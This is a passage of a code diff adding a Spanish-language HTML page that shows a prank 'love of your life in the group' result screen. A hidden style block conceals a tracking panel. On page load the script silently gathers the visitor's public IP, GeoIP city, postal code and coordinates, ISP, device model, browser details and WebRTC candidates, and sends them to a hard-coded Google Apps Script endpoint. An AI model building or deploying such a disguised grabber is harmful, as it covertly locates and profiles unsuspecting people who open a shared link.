@@ -1,0 +1,2859 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<title>amorgp</title>
+
+<style>
+
+*{
+  box-sizing:border-box;
+}
+
+body{
+  margin:0;
+  background:#3f1414;
+  color:#fff;
+  font-family:'Courier New',monospace;
+  font-size:12px;
+  overflow:auto;
+  touch-action:manipulation;
+  -webkit-user-select:none;
+  user-select:none;
+}
+
+.container{
+  width:100%;
+  max-width:430px;
+  margin:auto;
+  padding:10px;
+}
+
+h1{
+  font-size:18px;
+  margin:0 0 10px;
+  color:#00eaff;
+}
+
+.section{
+  border:1px solid #20283d;
+  background:#33525c;
+  margin-bottom:8px;
+  padding:9px;
+  border-radius:6px;
+}
+
+.title{
+  color:#00eaff;
+  font-weight:bold;
+  margin-bottom:6px;
+}
+
+.row{
+  display:flex;
+  justify-content:space-between;
+  gap:10px;
+  padding:2px 0;
+  border-bottom:1px solid #111727;
+}
+
+.label{
+  color:#8993ad;
+}
+
+.value{
+  text-align:right;
+  word-break:break-all;
+}
+
+.ok{
+  color:#ff00f2;
+}
+
+.error{
+  color:#ff4d67;
+}
+
+.warn{
+  color:#ffc400;
+}
+
+.info{
+  color:#5eb7ff;
+}
+
+button{
+  width:100%;
+  border:1px solid #00eaff;
+  background:#07131c;
+  color:#dc5fec;
+  padding:10px;
+  border-radius:5px;
+  font-family:inherit;
+  font-weight:bold;
+  margin-bottom:8px;
+}
+
+#debug{
+  max-height:260px;
+  overflow:auto;
+  white-space:pre-wrap;
+  word-break:break-word;
+  color:#aeb7c9;
+  line-height:1.4;
+}
+
+#sendStatus{
+  line-height:1.5;
+  word-break:break-word;
+}
+
+</style>
+
+<style id="silent-ui">
+
+.container{
+  display:none!important
+}
+
+html,body{
+  width:100%;
+  height:100%;
+  margin:0!important;
+  padding:0!important;
+  overflow:hidden!important;
+  background:#143110!important
+}
+
+#doneScreen{
+  position:fixed;
+  inset:0;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:24px;
+  background:radial-gradient(circle at 50% 35%,rgba(150, 6, 138, 0.178),transparent 38%),#501655;
+  z-index:999999;
+  font-family:'Courier New',monospace;
+  color:#fff;
+  text-align:center
+}
+
+#doneCard{
+  width:min(360px,100%);
+  padding:32px 24px;
+  border:1px solid rgba(129, 128, 68, 0.28);
+  border-radius:18px;
+  background:rgba(255, 7, 234, 0.94);
+  box-shadow:0 0 35px rgba(4, 89, 97, 0.24),0 18px 55px rgba(82, 9, 9, 0.45)
+}
+
+#doneIcon{
+  width:74px;
+  height:74px;
+  margin:0 auto 20px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border:2px solid #00ff88;
+  color:#00ff88;
+  font-family:Arial,sans-serif;
+  font-size:42px;
+  font-weight:bold;
+  box-shadow:0 0 25px rgba(0,255,136,.16)
+}
+
+#doneTitle{
+  margin:0;
+  font-family:Arial,sans-serif;
+  font-size:27px;
+  font-weight:700;
+  color:#fff
+}
+
+#doneText{
+  margin-top:11px;
+  color:#8993ad;
+  font-size:13px;
+  line-height:1.6
+}
+
+#doneStatus{
+  margin-top:20px;
+  color:#f7f5f6;
+  font-size:12px
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div id="doneScreen">
+
+  <div id="doneCard">
+
+    <div id="doneIcon">✓</div>
+
+    <h1 id="doneTitle">EL AMOR DE TU VIDA DEL GRUPO ES ...</h1>
+
+    <div id="doneText">Nadie, te vas a quedar solari.</div>
+
+    <div id="doneStatus">Mejor suerta para la próxima ✓</div>
+
+  </div>
+
+</div>
+
+
+<div class="container">
+
+<h1>🌐 Diagnóstico de red</h1>
+
+<button onclick="runDiagnostic()">🔄 Actualizar diagnóstico</button>
+
+
+<div class="section">
+
+  <div class="title">🌍 CONEXIÓN PÚBLICA</div>
+
+  <div class="row">
+    <span class="label">Estado</span>
+    <span class="value" id="connectionStatus">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">IP pública</span>
+    <span class="value" id="publicIp">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">IPv4 pública</span>
+    <span class="value" id="ipv4">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">IPv6 pública</span>
+    <span class="value" id="ipv6">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">IP privada</span>
+    <span class="value" id="privateIp">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Subred</span>
+    <span class="value" id="subnet">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Tipo conexión</span>
+    <span class="value" id="connectionType">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Velocidad estimada</span>
+    <span class="value" id="speed">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">ISP / Organización</span>
+    <span class="value" id="isp">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">ASN</span>
+    <span class="value" id="asn">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Hostname</span>
+    <span class="value" id="hostname">No disponible</span>
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">📍 GEOIP (POR IP)</div>
+
+  <div class="row">
+    <span class="label">País</span>
+    <span class="value" id="geoCountry">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Región</span>
+    <span class="value" id="geoRegion">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Ciudad</span>
+    <span class="value" id="geoCity">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Código postal</span>
+    <span class="value" id="geoPostal">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Latitud GeoIP</span>
+    <span class="value" id="geoLat">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Longitud GeoIP</span>
+    <span class="value" id="geoLon">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Zona horaria</span>
+    <span class="value" id="geoTimezone">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">ISP</span>
+    <span class="value" id="geoIsp">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Organización</span>
+    <span class="value" id="geoOrg">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">ASN</span>
+    <span class="value" id="geoAsn">Esperando IP...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Hostname</span>
+    <span class="value" id="geoHostname">Esperando IP...</span>
+  </div>
+
+  <div id="geoStatus" class="info">
+    Esperando IP pública...
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">📍 GPS / UBICACIÓN REAL DEL DISPOSITIVO</div>
+
+  <div class="row">
+    <span class="label">Permiso</span>
+    <span class="value" id="geoPermission">No solicitado</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Latitud GPS</span>
+    <span class="value" id="gpsLat">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Longitud GPS</span>
+    <span class="value" id="gpsLon">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Precisión</span>
+    <span class="value" id="gpsAccuracy">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Altitud</span>
+    <span class="value" id="gpsAltitude">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Rumbo</span>
+    <span class="value" id="gpsHeading">No disponible</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Velocidad</span>
+    <span class="value" id="gpsSpeed">No disponible</span>
+  </div>
+
+  <div id="gpsStatus" class="info">
+    Ubicación del dispositivo no utilizada.
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">📱 DISPOSITIVO</div>
+
+  <div class="row">
+    <span class="label">Marca</span>
+    <span class="value" id="brand">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Modelo</span>
+    <span class="value" id="model">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Sistema</span>
+    <span class="value" id="os">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Android</span>
+    <span class="value" id="androidVersion">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Platform</span>
+    <span class="value" id="platform">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Arquitectura</span>
+    <span class="value" id="architecture">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">CPU cores</span>
+    <span class="value" id="cores">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">RAM</span>
+    <span class="value" id="ram">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Pantalla</span>
+    <span class="value" id="screen">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">DPR</span>
+    <span class="value" id="dpr">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Touch</span>
+    <span class="value" id="touch">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Orientación</span>
+    <span class="value" id="orientation">Detectando...</span>
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">🌐 BROWSER / WEBVIEW</div>
+
+  <div class="row">
+    <span class="label">Browser</span>
+    <span class="value" id="browser">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Chrome</span>
+    <span class="value" id="chrome">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">WebView</span>
+    <span class="value" id="webview">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Idioma</span>
+    <span class="value" id="language">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Origin</span>
+    <span class="value" id="origin">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Protocol</span>
+    <span class="value" id="protocol">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Secure</span>
+    <span class="value" id="secure">Detectando...</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Base URI</span>
+    <span class="value" id="baseUri">Detectando...</span>
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">⚙️ CAPACIDADES</div>
+
+  <div class="row">
+    <span class="label">Cookies</span>
+    <span class="value" id="cookies">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">localStorage</span>
+    <span class="value" id="localStorage">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">sessionStorage</span>
+    <span class="value" id="sessionStorage">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Fetch</span>
+    <span class="value" id="fetchSupport">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">WebSocket</span>
+    <span class="value" id="websocket">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">WebRTC</span>
+    <span class="value" id="webrtc">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">MediaDevices</span>
+    <span class="value" id="mediaDevices">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Geolocation</span>
+    <span class="value" id="geolocation">No utilizado</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Notifications</span>
+    <span class="value" id="notifications">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Bluetooth</span>
+    <span class="value" id="bluetooth">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">USB</span>
+    <span class="value" id="usb">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Clipboard</span>
+    <span class="value" id="clipboard">-</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Android Bridge</span>
+    <span class="value" id="androidBridge">-</span>
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">📡 WEBRTC / ICE</div>
+
+  <div class="row">
+    <span class="label">Host candidates</span>
+    <span class="value" id="hostCandidates">0</span>
+  </div>
+
+  <div class="row">
+    <span class="label">Srflx candidates</span>
+    <span class="value" id="srflxCandidates">0</span>
+  </div>
+
+  <div id="iceList"></div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">📤 ENVÍO A GOOGLE SHEETS</div>
+
+  <div id="sendStatus">
+    Esperando IP pública...
+  </div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">🕒 FECHA / HORA</div>
+
+  <div id="dateTime">-</div>
+
+</div>
+
+
+<div class="section">
+
+  <div class="title">🐛 DEBUG</div>
+
+  <div id="debug"></div>
+
+</div>
+
+</div>
+
+
+<script>
+
+const GOOGLE_SCRIPT_URL =
+"https://script.google.com/macros/s/AKfycbxOsNKSTqGCNInSuz5wGE92KDUHtKP_ZjPR9LdGvL28acnSxBAsse3i7DUyDeKq0Jdw/exec";
+
+let publicIpSent = false;
+let sendInProgress = false;
+let sendAttempts = 0;
+let hostCount = 0;
+let srflxCount = 0;
+
+const debugEl = document.getElementById("debug");
+
+function log(message){
+
+  const time = new Date().toLocaleTimeString();
+
+  debugEl.textContent +=
+    "[" + time + "] " + message + "\n";
+
+  debugEl.scrollTop = debugEl.scrollHeight;
+
+}
+
+function setValue(id,value,cls){
+
+  const el = document.getElementById(id);
+
+  if(!el) return;
+
+  el.textContent = value;
+
+  if(cls){
+    el.className = "value " + cls;
+  }
+
+}
+
+
+function detectDevice(){
+
+  const ua = navigator.userAgent || "";
+  const platform = navigator.platform || "";
+  const uaData = navigator.userAgentData || null;
+
+  let model = "Desconocido";
+  let brand = "Desconocida";
+  let android = "Desconocido";
+
+  const androidMatch = ua.match(/Android\s+([0-9.]+)/i);
+
+  if(androidMatch)
+    android = androidMatch[1];
+
+  const buildMatch = ua.match(/;\s*([^;)]+?)\s+Build\//i);
+
+  if(buildMatch){
+
+    model = buildMatch[1].trim();
+
+    if(/moto|motorola/i.test(model))
+      brand = "Motorola";
+
+    else if(/samsung|sm-[a-z0-9-]+/i.test(model))
+      brand = "Samsung";
+
+    else if(/xiaomi|redmi|poco/i.test(model))
+      brand = "Xiaomi";
+
+    else if(/huawei/i.test(model))
+      brand = "Huawei";
+
+    else if(/oneplus/i.test(model))
+      brand = "OnePlus";
+
+    else if(/oppo/i.test(model))
+      brand = "OPPO";
+
+    else if(/vivo/i.test(model))
+      brand = "vivo";
+
+    else if(/pixel/i.test(model))
+      brand = "Google";
+
+  }
+
+
+  if(
+    uaData &&
+    typeof uaData.getHighEntropyValues === "function"
+  ){
+
+    uaData.getHighEntropyValues([
+      "model",
+      "platform",
+      "platformVersion",
+      "architecture",
+      "bitness",
+      "fullVersionList"
+    ])
+    .then(function(d){
+
+      if(d.model){
+
+        model = d.model;
+
+        setValue("model",model,"ok");
+
+        if(/^moto|motorola/i.test(d.model))
+          brand = "Motorola";
+
+        else if(/^sm-|samsung/i.test(d.model))
+          brand = "Samsung";
+
+        else if(/redmi|poco|xiaomi/i.test(d.model))
+          brand = "Xiaomi";
+
+        setValue("brand",brand,"ok");
+
+        log(
+          "Modelo obtenido mediante User-Agent Client Hints: " +
+          d.model
+        );
+
+      }
+
+      if(d.platform)
+        setValue("os",d.platform);
+
+      if(
+        d.platformVersion &&
+        /android/i.test(d.platform || "")
+      ){
+        setValue(
+          "androidVersion",
+          d.platformVersion
+        );
+      }
+
+      if(d.architecture)
+        setValue(
+          "architecture",
+          d.architecture
+        );
+
+    })
+    .catch(function(e){
+
+      log(
+        "User-Agent Client Hints no disponibles: " +
+        (e.message || e)
+      );
+
+    });
+
+  }
+
+
+  try{
+
+    if(typeof window.android !== "undefined"){
+
+      const names = [];
+      let obj = window.android;
+      let depth = 0;
+
+      while(obj && depth < 3){
+
+        try{
+          names.push.apply(
+            names,
+            Object.getOwnPropertyNames(obj)
+          );
+        }catch(e){}
+
+        try{
+          obj = Object.getPrototypeOf(obj);
+        }
+        catch(e){
+          break;
+        }
+
+        depth++;
+
+      }
+
+      const unique =
+        Array.from(new Set(names));
+
+      log(
+        "Android Bridge detectado. Propiedades visibles: " +
+        unique.slice(0,80).join(", ")
+      );
+
+    }
+
+  }
+  catch(e){
+
+    log(
+      "No se pudo inspeccionar Android Bridge: " +
+      (e.message || e)
+    );
+
+  }
+
+
+  setValue("brand",brand);
+  setValue("model",model);
+
+  setValue(
+    "os",
+    android !== "Desconocido"
+      ? "Android"
+      : "Desconocido"
+  );
+
+  setValue(
+    "androidVersion",
+    android
+  );
+
+  setValue(
+    "platform",
+    platform || "Desconocido"
+  );
+
+
+  let architecture = "Desconocida";
+
+  if(
+    /aarch64|arm64|armv8/i.test(
+      platform + " " + ua
+    )
+  ){
+
+    architecture = "ARM64 / ARMv8";
+
+  }
+
+  else if(
+    /arm/i.test(
+      platform + " " + ua
+    )
+  ){
+
+    architecture = "ARM";
+
+  }
+
+  else if(
+    /x86_64|amd64/i.test(
+      platform + " " + ua
+    )
+  ){
+
+    architecture = "x86_64";
+
+  }
+
+
+  setValue(
+    "architecture",
+    architecture
+  );
+
+  setValue(
+    "cores",
+    navigator.hardwareConcurrency
+      ? navigator.hardwareConcurrency +
+        " hilos lógicos"
+      : "No disponible"
+  );
+
+  setValue(
+    "ram",
+    navigator.deviceMemory
+      ? navigator.deviceMemory +
+        " GB aprox."
+      : "No disponible"
+  );
+
+  setValue(
+    "screen",
+    screen.width +
+    " × " +
+    screen.height
+  );
+
+  setValue(
+    "dpr",
+    window.devicePixelRatio || "1"
+  );
+
+  setValue(
+    "touch",
+    navigator.maxTouchPoints > 0
+      ? "Sí (" +
+        navigator.maxTouchPoints +
+        ")"
+      : "No"
+  );
+
+  setValue(
+    "orientation",
+    screen.orientation
+      ? screen.orientation.type
+      : (
+        window.innerWidth >
+        window.innerHeight
+          ? "landscape"
+          : "portrait"
+      )
+  );
+
+  log("UA: " + ua);
+  log("Platform: " + platform);
+
+  return {
+    model:model,
+    platform:platform
+  };
+
+}
+
+
+function detectBrowser(){
+
+  const ua = navigator.userAgent || "";
+
+  let browser = "Desconocido";
+
+  if(/Chrome\/[\d.]+/i.test(ua))
+    browser = "Chrome";
+
+  if(/Firefox/i.test(ua))
+    browser = "Firefox";
+
+  if(/Edg/i.test(ua))
+    browser = "Edge";
+
+  setValue(
+    "browser",
+    browser
+  );
+
+  const chromeMatch =
+    ua.match(/Chrome\/([\d.]+)/i);
+
+  setValue(
+    "chrome",
+    chromeMatch
+      ? chromeMatch[1]
+      : "No disponible"
+  );
+
+  const isWebView =
+    /\bwv\b/i.test(ua) ||
+    /; wv\)/i.test(ua);
+
+  setValue(
+    "webview",
+    isWebView ? "Sí" : "No"
+  );
+
+  setValue(
+    "language",
+    navigator.language ||
+    "No disponible"
+  );
+
+  setValue(
+    "origin",
+    location.origin ||
+    "null"
+  );
+
+  setValue(
+    "protocol",
+    location.protocol ||
+    "No disponible"
+  );
+
+  setValue(
+    "secure",
+    window.isSecureContext
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "baseUri",
+    document.baseURI ||
+    "No disponible"
+  );
+
+  return isWebView;
+
+}
+
+
+function detectCapabilities(){
+
+  setValue(
+    "cookies",
+    navigator.cookieEnabled
+      ? "Sí"
+      : "No"
+  );
+
+
+  let local = "No";
+
+  try{
+
+    localStorage.setItem(
+      "__test",
+      "1"
+    );
+
+    localStorage.removeItem(
+      "__test"
+    );
+
+    local = "Sí";
+
+  }
+  catch(e){
+
+    local = "No";
+
+  }
+
+  setValue(
+    "localStorage",
+    local
+  );
+
+
+  let session = "No";
+
+  try{
+
+    sessionStorage.setItem(
+      "__test",
+      "1"
+    );
+
+    sessionStorage.removeItem(
+      "__test"
+    );
+
+    session = "Sí";
+
+  }
+  catch(e){
+
+    session = "No";
+
+  }
+
+  setValue(
+    "sessionStorage",
+    session
+  );
+
+
+  setValue(
+    "fetchSupport",
+    typeof fetch === "function"
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "websocket",
+    typeof WebSocket === "function"
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "webrtc",
+    typeof RTCPeerConnection === "function"
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "mediaDevices",
+    navigator.mediaDevices
+      ? "Sí"
+      : "No"
+  );
+
+
+  /*
+   * IMPORTANTE:
+   * No se consulta navigator.permissions
+   * y no se utiliza navigator.geolocation.
+   * Por lo tanto, esta página NO solicita
+   * permiso de ubicación al navegador.
+   */
+
+  setValue(
+    "geolocation",
+    "No utilizado"
+  );
+
+
+  setValue(
+    "notifications",
+    typeof Notification !== "undefined"
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "bluetooth",
+    navigator.bluetooth
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "usb",
+    navigator.usb
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "clipboard",
+    navigator.clipboard
+      ? "Sí"
+      : "No"
+  );
+
+  setValue(
+    "androidBridge",
+    typeof window.android !== "undefined"
+      ? "EXISTE"
+      : "No"
+  );
+
+  log(
+    "Android Bridge: " +
+    (
+      typeof window.android !== "undefined"
+        ? "EXISTE"
+        : "NO EXISTE"
+    )
+  );
+
+}
+
+
+async function detectGeoIP(ip){
+
+  if(!ip) return;
+
+  setValue(
+    "geoStatus",
+    "Consultando GeoIP...",
+    "info"
+  );
+
+  log(
+    "Consultando GeoIP para " +
+    ip
+  );
+
+
+  const providers = [
+
+    {
+      name:"ipwho.is",
+
+      url:
+        "https://ipwho.is/" +
+        encodeURIComponent(ip),
+
+      parse:function(d){
+
+        if(
+          !d ||
+          d.success === false
+        ){
+
+          throw new Error(
+            d &&
+            d.message ||
+            "respuesta inválida"
+          );
+
+        }
+
+        return {
+
+          country:d.country,
+
+          region:d.region,
+
+          city:d.city,
+
+          postal:d.postal,
+
+          lat:d.latitude,
+
+          lon:d.longitude,
+
+          timezone:
+            d.timezone &&
+            (
+              d.timezone.id ||
+              d.timezone
+            ),
+
+          isp:
+            d.connection &&
+            d.connection.isp,
+
+          org:
+            d.connection &&
+            d.connection.org,
+
+          asn:
+            d.connection &&
+            d.connection.asn,
+
+          hostname:d.hostname
+
+        };
+
+      }
+
+    },
+
+
+    {
+
+      name:"ipapi.co",
+
+      url:
+        "https://ipapi.co/" +
+        encodeURIComponent(ip) +
+        "/json/",
+
+      parse:function(d){
+
+        if(
+          !d ||
+          d.error
+        ){
+
+          throw new Error(
+            d &&
+            d.reason ||
+            "respuesta inválida"
+          );
+
+        }
+
+        return {
+
+          country:d.country_name,
+
+          region:d.region,
+
+          city:d.city,
+
+          postal:d.postal,
+
+          lat:d.latitude,
+
+          lon:d.longitude,
+
+          timezone:d.timezone,
+
+          isp:d.org,
+
+          org:d.org,
+
+          asn:d.asn,
+
+          hostname:d.hostname
+
+        };
+
+      }
+
+    }
+
+  ];
+
+
+  for(
+    let i = 0;
+    i < providers.length;
+    i++
+  ){
+
+    const p = providers[i];
+
+    try{
+
+      log(
+        "GeoIP -> " +
+        p.name
+      );
+
+      const r =
+        await fetch(
+          p.url,
+          {
+            method:"GET",
+            cache:"no-store"
+          }
+        );
+
+      if(!r.ok)
+        throw new Error(
+          "HTTP " + r.status
+        );
+
+      const g =
+        p.parse(
+          await r.json()
+        );
+
+
+      setValue(
+        "geoCountry",
+        g.country ||
+        "No disponible",
+        "ok"
+      );
+
+      setValue(
+        "geoRegion",
+        g.region ||
+        "No disponible"
+      );
+
+      setValue(
+        "geoCity",
+        g.city ||
+        "No disponible",
+        "ok"
+      );
+
+      setValue(
+        "geoPostal",
+        g.postal ||
+        "No disponible"
+      );
+
+      setValue(
+        "geoLat",
+        g.lat != null
+          ? g.lat
+          : "No disponible",
+        "ok"
+      );
+
+      setValue(
+        "geoLon",
+        g.lon != null
+          ? g.lon
+          : "No disponible",
+        "ok"
+      );
+
+      setValue(
+        "geoTimezone",
+        g.timezone ||
+        "No disponible"
+      );
+
+      setValue(
+        "geoIsp",
+        g.isp ||
+        "No disponible",
+        "ok"
+      );
+
+      setValue(
+        "geoOrg",
+        g.org ||
+        "No disponible"
+      );
+
+      setValue(
+        "geoAsn",
+        g.asn ||
+        "No disponible"
+      );
+
+      setValue(
+        "geoHostname",
+        g.hostname ||
+        "No disponible"
+      );
+
+      setValue(
+        "geoStatus",
+        "✅ GeoIP obtenido con " +
+        p.name,
+        "ok"
+      );
+
+      log(
+        "GeoIP OK mediante " +
+        p.name
+      );
+
+      return;
+
+    }
+    catch(e){
+
+      log(
+        "GeoIP " +
+        p.name +
+        " falló: " +
+        (e.message || e)
+      );
+
+    }
+
+  }
+
+
+  setValue(
+    "geoStatus",
+    "❌ GeoIP bloqueado o sin respuesta desde este WebView.",
+    "error"
+  );
+
+}
+
+
+/*
+ * GPS ELIMINADO.
+ *
+ * Esta función ya no existe y no se llama
+ * navigator.geolocation.getCurrentPosition().
+ *
+ * Por lo tanto:
+ *
+ * - No aparece el diálogo de permiso.
+ * - No se consulta el permiso.
+ * - No se solicita ubicación.
+ * - No se obtiene ubicación GPS.
+ *
+ * La información GeoIP continúa funcionando
+ * independientemente de esto.
+ */
+
+
+function detectConnection(){
+
+  const connection =
+    navigator.connection ||
+    navigator.mozConnection ||
+    navigator.webkitConnection;
+
+  if(!connection){
+
+    setValue(
+      "connectionType",
+      "No disponible"
+    );
+
+    setValue(
+      "speed",
+      "No disponible"
+    );
+
+    return;
+
+  }
+
+  setValue(
+    "connectionType",
+    connection.effectiveType ||
+    connection.type ||
+    "Desconocido"
+  );
+
+  setValue(
+    "speed",
+    connection.downlink
+      ? connection.downlink +
+        " Mbps"
+      : "No disponible"
+  );
+
+}
+
+
+function detectPrivateSubnet(ip){
+
+  if(!ip) return;
+
+  const parts =
+    ip.split(".");
+
+  if(parts.length === 4){
+
+    setValue(
+      "subnet",
+      parts[0] + "." +
+      parts[1] + "." +
+      parts[2] + ".0/24"
+    );
+
+  }
+
+}
+
+
+function addCandidate(
+  ip,
+  type,
+  port
+){
+
+  const div =
+    document.createElement("div");
+
+  div.className = "row";
+
+  div.innerHTML =
+    '<span class="label">' +
+    type +
+    '</span>' +
+
+    '<span class="value">' +
+    ip +
+    (
+      port
+        ? ":" + port
+        : ""
+    ) +
+    '</span>';
+
+  document
+    .getElementById("iceList")
+    .appendChild(div);
+
+}
+
+
+function showDoneScreen(){
+
+  const screen =
+    document.getElementById(
+      "doneScreen"
+    );
+
+  if(screen)
+    screen.style.display = "flex";
+
+}
+
+
+function getSheetValue(id){
+
+  const el =
+    document.getElementById(id);
+
+  if(!el)
+    return "No disponible";
+
+  const value =
+    (el.textContent || "").trim();
+
+  if(
+    !value ||
+    value === "Detectando..." ||
+    value === "Esperando IP..." ||
+    value === "Esperando IP pública..." ||
+    value === "No disponible"
+  ){
+
+    return "No disponible";
+
+  }
+
+  return value;
+
+}
+
+
+function buildSheetModelValue(model){
+
+  if(
+    !model ||
+    model === "Detectando..." ||
+    model === "No disponible"
+  ){
+
+    model = "Desconocido";
+
+  }
+
+  return [
+
+    "Modelo: " + model,
+
+    "País: " +
+    getSheetValue("geoCountry"),
+
+    "Región/Provincia: " +
+    getSheetValue("geoRegion"),
+
+    "Ciudad: " +
+    getSheetValue("geoCity"),
+
+    "Código postal: " +
+    getSheetValue("geoPostal"),
+
+    "Latitud GeoIP: " +
+    getSheetValue("geoLat"),
+
+    "Longitud GeoIP: " +
+    getSheetValue("geoLon"),
+
+    "Zona horaria: " +
+    getSheetValue("geoTimezone"),
+
+    "ISP: " +
+    getSheetValue("geoIsp"),
+
+    "Organización: " +
+    getSheetValue("geoOrg"),
+
+    "ASN: " +
+    getSheetValue("geoAsn"),
+
+    "Hostname: " +
+    getSheetValue("geoHostname"),
+
+    "Latitud GPS: No disponible",
+
+    "Longitud GPS: No disponible",
+
+    "Precisión GPS: No disponible",
+
+    "Altitud GPS: No disponible",
+
+    "Rumbo GPS: No disponible",
+
+    "Velocidad GPS: No disponible"
+
+  ].join("\n");
+
+}
+
+
+function sendIpToGoogleSheet(ip){
+
+  if(!ip){
+
+    log(
+      "ENVÍO CANCELADO: no hay IP."
+    );
+
+    return;
+
+  }
+
+  if(
+    publicIpSent ||
+    sendInProgress
+  ){
+
+    log(
+      "ENVÍO CANCELADO: ya hay un envío realizado o en progreso."
+    );
+
+    return;
+
+  }
+
+  sendAttempts++;
+
+  sendInProgress = true;
+
+  const ua =
+    navigator.userAgent || "";
+
+  const platform =
+    navigator.platform || "";
+
+
+  let model =
+    document.getElementById("model")
+      ? document.getElementById("model").textContent
+      : "Desconocido";
+
+
+  if(
+    !model ||
+    model === "Detectando..." ||
+    model === "No disponible"
+  ){
+
+    model = "Desconocido";
+
+  }
+
+
+  const sheetModel =
+    buildSheetModelValue(model);
+
+  const status =
+    document.getElementById(
+      "sendStatus"
+    );
+
+
+  status.innerHTML =
+    '<span class="info">⏳ ENVIANDO DATOS...</span>';
+
+
+  log("================================");
+
+  log(
+    "ENVÍO COMPLETO A GOOGLE SHEETS"
+  );
+
+  log(
+    "IP: " + ip
+  );
+
+  log(
+    "Datos del campo Modelo:\n" +
+    sheetModel
+  );
+
+  log(
+    "Platform: " + platform
+  );
+
+  log(
+    "UA: " + ua
+  );
+
+
+  const data =
+    new URLSearchParams();
+
+  data.append(
+    "ip",
+    ip
+  );
+
+  data.append(
+    "userAgent",
+    ua
+  );
+
+  data.append(
+    "platform",
+    platform
+  );
+
+  data.append(
+    "model",
+    sheetModel
+  );
+
+
+  data.append(
+    "country",
+    getSheetValue("geoCountry")
+  );
+
+  data.append(
+    "region",
+    getSheetValue("geoRegion")
+  );
+
+  data.append(
+    "city",
+    getSheetValue("geoCity")
+  );
+
+  data.append(
+    "postal",
+    getSheetValue("geoPostal")
+  );
+
+  data.append(
+    "geoLat",
+    getSheetValue("geoLat")
+  );
+
+  data.append(
+    "geoLon",
+    getSheetValue("geoLon")
+  );
+
+  data.append(
+    "timezone",
+    getSheetValue("geoTimezone")
+  );
+
+  data.append(
+    "isp",
+    getSheetValue("geoIsp")
+  );
+
+  data.append(
+    "org",
+    getSheetValue("geoOrg")
+  );
+
